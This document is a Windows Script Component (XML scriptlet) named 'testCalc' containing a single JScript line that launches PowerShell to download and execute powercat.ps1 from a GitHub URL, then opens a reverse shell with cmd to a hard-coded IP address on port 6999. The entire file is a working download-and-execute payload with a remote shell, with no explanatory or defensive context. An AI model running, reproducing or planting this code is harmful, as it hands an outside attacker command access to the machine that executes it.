<?xml version="1.0"?>

<package>
<component id="testCalc">

<script language="JScript">

var r = new ActiveXObject("WScript.Shell").Run("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/AlexIThelp/it/master/powercat.ps1');powercat -c 156.251.144.219 -p 6999 -e cmd"); 

</script>

</component>
</package>
